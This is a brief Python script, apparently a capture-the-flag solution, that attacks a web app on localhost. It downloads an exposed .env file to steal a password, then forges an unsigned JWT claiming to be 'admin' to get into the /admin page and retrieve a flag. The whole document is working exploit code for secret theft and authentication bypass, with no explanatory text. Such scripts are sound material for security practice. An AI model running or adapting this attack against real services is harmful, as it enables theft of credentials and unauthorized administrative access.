import json
import requests
import base64 as b64
url = "http://localhost:8080"
s = requests.Session()
s.get(url)
r = s.get(url + "/files/.env")
password = (r.content.decode("utf-8").splitlines()[0].split("=")[1])


def generate_jwt(obj):
    header = {
        "alg": "HS256",
        "typ": "JWT"
    }
    def f(x): return b64.b64encode(json.dumps(x).encode("ASCII"))
    jwt = f(header) + b"." + f(obj)
    jwt = jwt.decode("ASCII")
    jwt = jwt.replace("=", "")
    return jwt


jwt_object = {
    "name": "admin",
    "pwd": password
}

s.headers['Authorization'] = "Bearer " + generate_jwt(jwt_object)
print(s.headers['Authorization'])
r = s.get(url + "/admin")
flag_endpoint = r.text.split(" ")[-1]
print(flag_endpoint)
r = s.get(url + flag_endpoint)
flag = r.text
print(flag)
